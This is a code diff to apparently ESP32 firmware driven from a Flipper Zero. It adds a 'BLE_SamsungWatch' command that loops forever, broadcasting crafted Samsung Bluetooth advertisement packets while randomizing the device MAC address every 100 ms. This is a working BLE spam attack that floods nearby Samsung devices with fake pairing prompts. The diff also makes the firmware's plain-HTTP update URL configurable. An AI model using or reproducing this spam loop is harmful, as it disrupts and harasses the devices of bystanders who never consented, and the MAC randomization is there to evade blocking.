@@ -7,6 +7,38 @@
 #include <wifi.h>
 #include "../../Public/Controllers/YoutubeController.h"
 #include "../../Public/Features/Dial.h"
+#ifdef USE_BLUETOOTH
+#include <NimBLEDevice.h>
+
+struct SamsungTestBLEData {
+  NimBLEAdvertisementData advertisementData;
+  NimBLEAdvertisementData scanResponse;
+};
+
+SamsungTestBLEData GetSamsungTestBLE() {
+  NimBLEAdvertisementData advertisementData = NimBLEAdvertisementData();
+  NimBLEAdvertisementData scanResponse = NimBLEAdvertisementData();
+
+  // Split your specific packet data into advertisement and scan response data
+  uint8_t advertisementPacket[] = {
+    0x02, 0x01, 0x18, 0x1B, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14,
+    0x15, 0x03, 0x21, 0x01, 0x09, 0xEF, 0x0C, 0x01, 0x47, 0x06, 0x3C, 0x94, 0x8E,
+    0x00, 0x00, 0x00, 0x00, 0xC7, 0x00
+  };
+  uint8_t scanResponsePacket[] = {
+    0x10, 0xFF, 0x75, 0x00, 0x00, 0x63, 0x50, 0x8D, 0xB1, 0x17, 0x40, 0x46,
+    0x64, 0x64, 0x00, 0x01, 0x04
+  };
+
+  // Add the packet data to the advertisement data and scan response
+  advertisementData.addData(std::string((char *)advertisementPacket, sizeof(advertisementPacket)));
+  scanResponse.addData(std::string((char *)scanResponsePacket, sizeof(scanResponsePacket)));
+
+  // Return both advertisement data and scan response
+  return { advertisementData, scanResponse };
+}
+
+#endif
 
 void retainLineExcludingKeywords(String &content, const String &keyword1, const String &keyword2) {
     int index1 = content.indexOf(keyword1);
@@ -53,6 +85,10 @@ struct BaseBoardConfig {
     int sdpin = -1;
     bool SupportsBluetooth = false;
     bool SupportsNeoPixel = false;
+#ifdef USE_BLUETOOTH
+    NimBLEAdvertising* pAdvertising;
+#endif
+    String UpdateURL = "";
     Adafruit_NeoPixel strip;
 
     BaseBoardConfig() {
@@ -287,7 +323,7 @@ struct BaseBoardConfig {
 
                     WiFiClient client;
 
-                    t_httpUpdate_return ret = httpUpdate.update(client, "http://cdn.spookytools.com/assets/ghostesp.bin", "1.0.0", 0);
+                    t_httpUpdate_return ret = httpUpdate.update(client, UpdateURL, "1.0.0", 0);
 
                     switch(ret) {
                         case HTTP_UPDATE_FAILED:
@@ -304,6 +340,39 @@ struct BaseBoardConfig {
                     }
                 }
             }
+
+#ifdef USE_BLUETOOTH
+
+            if (flipperMessage.startsWith("BLE_SamsungWatch") && SupportsBluetooth)
+            {
+                flipperMessage.remove(0, 16);
+
+                while (true) {
+                    NimBLEDevice::init("");
+                    NimBLEServer* pServer = NimBLEDevice::createServer();
+                    pAdvertising = pServer->getAdvertising();
+
+
+                    SamsungTestBLEData advertisementData = GetSamsungTestBLE();
+                    pAdvertising->setAdvertisementData(advertisementData.advertisementData);
+                    pAdvertising->setScanResponseData(advertisementData.scanResponse);
+
+
+                    pAdvertising->start();
+                    Serial.println("Sending Packet");
+                    delay(100);
+                    NimBLEDevice::deinit();
+
+                    uint8_t mac[6];
+                    for (int i = 0; i < 6; i++) {
+                    mac[i] = random(0, 256);
+                    }
+                    mac[0] = (mac[0] & 0xFC) | 0x02;
+
+                    esp_base_mac_addr_set(mac);
+                }
+            }
+#endif
         }
     }
 };
